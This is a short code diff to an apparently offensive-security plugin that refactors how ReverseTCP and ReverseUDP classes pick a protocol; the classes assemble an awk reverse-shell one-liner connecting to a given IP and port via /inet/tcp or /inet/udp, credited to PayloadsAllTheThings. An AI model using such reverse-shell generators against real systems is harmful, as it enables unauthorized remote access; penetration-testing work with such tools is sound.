@@ -21,7 +21,7 @@ class ReverseTCP(plugin.ReverseShell):
         #     help = "file to write",
         #     nargs = 2
         # )
-
+        self.shell_type = "tcp"
         self.opts.description = "[ReverseShell][TCP] awk from swisskyrepo/PayloadsAllTheThings. License MIT."
         self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"
 
@@ -36,7 +36,7 @@ class ReverseTCP(plugin.ReverseShell):
         #     self.shell += """LFILE }'"""
         # else:
         self.shell = """awk 'BEGIN {s = \""""
-        if self.is_udp:
+        if self.shell_type == "udp":
             self.shell += f"""/inet/udp/0/{self.args.ip}/{self.args.port}";"""
         else:
             self.shell += f"""/inet/tcp/0/{self.args.ip}/{self.args.port}";"""
@@ -48,5 +48,5 @@ class ReverseTCP(plugin.ReverseShell):
 class ReverseUDP(ReverseTCP):
     def __init__(self):
         super().__init__()
-        self.is_udp = True
+        self.shell_type = "udp"
         self.opts.description = "[ReverseShell][UDP] Generic shells from swisskyrepo/PayloadsAllTheThings. License MIT."
